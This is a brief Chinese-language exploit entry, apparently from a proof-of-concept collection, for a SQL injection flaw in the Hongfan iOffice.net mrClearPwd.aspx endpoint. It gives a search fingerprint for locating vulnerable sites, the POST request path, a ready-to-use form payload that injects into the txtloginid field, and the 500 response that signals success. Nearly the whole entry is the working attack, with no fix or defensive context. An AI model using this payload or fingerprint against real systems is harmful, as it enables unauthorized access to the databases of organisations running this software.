# 红帆iofficemrClearPwd.aspx存在SQL注入漏洞

红帆 ｜ SQL注入 ｜ —
- **指纹**：`title="iOffice.net"`
- **请求**：`POST /ioffice/prg/mr/ClearPwd/mrClearPwd.aspx HTTP/1.1`

**Payload**
```
__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=YOUR__VIEWSTATE&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&txtloginid='-1/user--+-&grop1=rad2&txtmobileNO=1&txtmobile=13888888888&ok=%E7%A1%AE%E3%80%80%E8%AE%A4
```
- **响应特征**：500